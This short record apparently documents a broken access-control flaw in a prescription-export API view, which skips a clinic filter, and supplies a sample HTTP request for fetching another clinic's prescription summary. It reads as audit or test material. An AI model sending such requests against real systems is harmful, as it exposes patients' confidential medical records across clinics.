diagnosis: In export_summary, the view queries MedicalPrescription using get_object_or_404(MedicalPrescription, pk=pk) directly instead of calling self.get_object(). This bypasses the clinic filter defined in get_queryset(), allowing any user to export confidential prescription details from other clinics.
exploit_request:
GET /api/prescriptions/77402/export-summary/ HTTP/1.1
Host: rx.careplatform.org
Authorization: Bearer <clinic_a_doctor_jwt>
